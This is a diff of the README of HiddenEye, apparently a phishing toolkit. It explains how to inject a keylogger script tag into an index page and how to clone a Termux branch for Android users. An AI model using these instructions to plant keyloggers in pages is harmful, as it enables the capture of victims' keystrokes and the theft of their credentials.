@@ -60,16 +60,22 @@
 
 **HOW TO ADD IT MANUALLY ?
 -- You can add this manually by putting the codes on index page.(put these code at anywhere inside the index page // but not between any other script codes)
-
 ```
 <script src="keylogger.js"></script>
 
 ```
-### CLONE
+
+**4) TERMUX-SUPPORT-BRANCH ADDED**
+- We care about Android Users, As Termux don't Have 'sudo' command as default, So we have created another branch of HiddenEye For Our Termux Users.
+[CHECK HERE](https://github.com/DarkSecDevelopers/HiddenEye/blob/Termux-Support-Branch)
+- Termux Users Please Clone With This command
 ```
-git clone https://github.com/DarkSecDevelopers/HiddenEye.git
+git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEye.git
+
 ```
-## FOR FURTHER INSTALLATION PROCEDURE - (CHECK INSTRUCTIONS)
+
+
+## FOR FURTHER INSTALLATION PROCEDURE - [(CHECK INSTRUCTIONS)](https://github.com/DarkSecDevelopers/HiddenEye/blob/master/instructions.md)
 
 ## AVAILABLE PAGES
 
